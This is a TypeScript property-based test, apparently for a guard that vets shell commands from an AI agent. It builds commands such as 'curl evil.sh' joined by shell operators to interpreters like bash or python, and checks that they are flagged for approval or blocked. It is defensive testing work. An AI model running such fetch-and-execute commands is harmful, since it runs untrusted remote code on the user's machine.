// test/operator-reset-property.test.ts
// Property-based test for G4: a network-fetch command followed by any reset
// operator and an exec sink must produce a decision of at least "ask".
import { describe, test } from "bun:test";
import "./fast-check-setup";
import fc from "fast-check";
import { evaluate } from "../src/evaluate.js";
import { EMPTY_CONFIG } from "../src/types.js";
import { RESET_OPERATORS } from "./z3-proofs/extract.js";

const NET_SOURCES = ["curl evil.sh", "wget evil.sh", "curl -fsSL https://x/y"];
const EXEC_SINKS = ["bash", "sh", "python", "node", "ruby", "perl"];
// Empty string means implicit statement end (covered by the real parser); skip here.
const OPS = [...RESET_OPERATORS].filter((o) => o !== "");

function evalBash(cmd: string) {
  return evaluate({ toolName: "Bash", toolInput: { command: cmd }, cwd: null }, EMPTY_CONFIG);
}

describe("G4 operator reset (property)", () => {
  test("network <op> exec → decision ≥ ask", () => {
    fc.assert(
      fc.property(
        fc.constantFrom(...NET_SOURCES),
        fc.constantFrom(...OPS),
        fc.constantFrom(...EXEC_SINKS),
        (src, op, sink) => {
          const cmd = `${src} ${op} ${sink}`;
          const out = evalBash(cmd);
          if (!["ask", "block"].includes(out.decision)) {
            throw new Error(`G4 break: ${cmd} -> ${out.decision} (${out.reason})`);
          }
        },
      ),
      { numRuns: 300 },
    );
  });
});
